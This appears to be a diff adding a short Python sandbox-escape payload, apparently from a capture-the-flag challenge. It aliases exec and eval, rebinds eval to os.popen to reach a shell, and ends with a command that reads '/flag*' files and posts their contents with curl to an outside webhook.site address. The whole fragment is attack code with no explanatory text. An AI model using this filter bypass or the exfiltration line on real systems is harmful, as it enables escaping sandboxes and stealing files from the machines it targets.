@@ -1,0 +1,8 @@
+{e:=exec}
+{eval:=e}
+import os
+o=os
+f=o.popen
+eval=f
+sh
+cat /flag* | curl -d @- https://webhook.site/********-****-****-****-************
